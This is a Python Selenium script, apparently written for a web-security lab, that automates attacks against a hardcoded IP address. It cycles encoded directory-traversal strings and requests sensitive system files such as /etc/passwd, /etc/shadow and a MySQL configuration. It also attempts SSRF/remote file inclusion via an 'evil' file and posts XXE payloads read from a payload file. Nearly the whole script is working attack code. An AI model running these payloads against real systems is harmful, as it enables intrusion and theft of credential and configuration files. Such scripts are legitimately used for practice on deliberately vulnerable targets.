"""

Module Broken Auth.
Urls: http://34.192.19.10/directory_traversal_2.php?directory=documents
http://34.192.19.10/directory_traversal_1.php?page=message.txt

"""

from main import init
from selenium.webdriver.common.keys import Keys
import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import requests

PATH = "C:\Program Files (x86)\chromedriver.exe"

driver = init()[0]
target_url = 'http://34.192.19.10/directory_traversal_2.php?directory=documents'
driver.get(target_url)


def lfi_rfi_attack():

    directory_traversal_list = [
        '../',
        '../../',
        '../../../',
        '../../../etc/',
        '..\/',
        '%252e%252e%252f',
        '%c0%ae%c0%ae%c0%af',
    ]

    file_list = [
        'c:\windows\system32\license.rtf',
        'c:\windows\system32\eula.txt',
        '/etc/issue',
        '../../../etc/passwd',
        '../../../etc/shadow',
        '../../../etc/group',
        '../../../etc/hosts',
        '../../../etc/motd',
        '../../../etc/mysql/my.cnf',
        '../var/log/',
    ]

    for directory_traversal in directory_traversal_list:
        # print(path)
        target_url = f'http://34.192.19.10/directory_traversal_2.php?directory={directory_traversal}'
        driver.get(target_url)
        if target_url == driver.current_url:
            print('[ + ] Path Traversal Attack passed: ', directory_traversal)
        # html = driver.find_element_by_id('main').text
        # print(html)
        time.sleep(3)

    for file in file_list:
        target_url = f'http://34.192.19.10/directory_traversal_1.php?page={file}'
        driver.get(target_url)
        if target_url == driver.current_url:
            print('[ + ] Path Traversal Attack passed: ', file)
        # html = driver.find_element_by_id('main').text
        # print(html)
        time.sleep(3)

def ssrf_attack():
    """
        URL: http://34.192.19.10/rlfi.php?language=lang_en.php&action=go
        Hacked_URL: http://34.192.19.10/rlfi.php?language=./evil/ssrf-1.txt&action=go?ip=34.192.19.10
    """

    print('[ + ] Starting SSRF Attack: ')
    target_url = 'http://34.192.19.10/rlfi.php?language=lang_en.php&action=go'
    driver.get(target_url)
    time.sleep(3)

    try:
        driver.get('http://34.192.19.10/rlfi.php?language=./evil/ssrf-1.txt&action=go?ip=34.192.19.10')
        WebDriverWait(driver, 5).until(EC.alert_is_present())

        # switch_to.alert for switching to alert and accept
        alert = driver.switch_to.alert
        if alert:
            print('[ + ] SSRF Passed')
            alert.accept()

    except TimeoutException:
        print("alert does not Exist in page")

    driver.quit()

def xxe_attack():
    print('[+] XXE Attack Start')
    target_url = 'http://34.192.19.10/xxe-1.php'
    driver.get(target_url)

    time.sleep(5)  # Wait Cookies To load
    driver_cookies = driver.get_cookies()
    c = {c['name']: c['value'] for c in driver_cookies}

    with open('Payloads/XXE_Payloads.txt', 'r', encoding='utf-8') as xxe_payloads:
        payloads = xxe_payloads.read().split('\n\n')

        for payload in payloads:
            res = requests.post('http://34.192.19.10/xxe-2.php', cookies=c, data=payload)
            if res.text.split('\n')[-1] == 'An error occured!':
                print('[+] XXE Attack Passed: ', payload)


        # for row in xxe_payloads.read().split('*'):
        #     print(row)
    driver.quit()
# lfi_rfi_attack()
xxe_attack()